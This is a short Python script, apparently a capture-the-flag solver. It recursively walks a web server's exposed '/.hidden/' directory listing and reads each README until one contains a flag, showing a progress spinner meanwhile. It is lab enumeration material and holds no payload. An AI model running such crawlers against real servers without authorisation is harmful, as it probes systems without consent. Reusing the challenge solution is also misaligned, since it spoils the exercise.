#!/usr/bin/env python3

import requests
import sys
import threading
import time
import bs4

"""
Global
"""
count_read = 0
flag = None

"""
Display Loader
"""
def display_loader():

	global flag

	CR = "\r"
	CL = "\x1b[2K"

	i = 0
	while flag == None:
		print(f"{CR}Scanning for flag (read file: {count_read:>6}) {'.' * i}", end=CL)
		i = (i + 1) % 4
		time.sleep(0.5)

	print(f"{CR}", end="")

"""
Search Flag
"""
def search_flag(_url: str):

	global count_read
	global flag

	paths = [ _url ]

	while paths:
		path = paths.pop()

		index = requests.get(path)
		html = bs4.BeautifulSoup(index.text, "lxml")
		links = html.find_all("a")

		for link in links:
			target = link.get("href")

			if target == "README":
				readme = requests.get(f"{path}/README")

				if "flag" in readme.text:
					flag = readme.text
					return

				count_read += 1

			elif target != "../" and target != "./":
				paths.append(f"{path}/{target}")

	flag = False

"""
Main
"""
def main(_ip: str):

	global flag

	loader = threading.Thread(target=search_flag, args=[f"http://{_ip}/.hidden/"], daemon=True).start()

	display_loader()

	print(flag if flag else "No flag has been found.\n", end="")

"""
Entrypoint
"""
if __name__ == "__main__":

	if len(sys.argv) != 2:
		print(f"usage: {sys.argv[0]} ip_address")
		sys.exit()

	main(sys.argv[1])
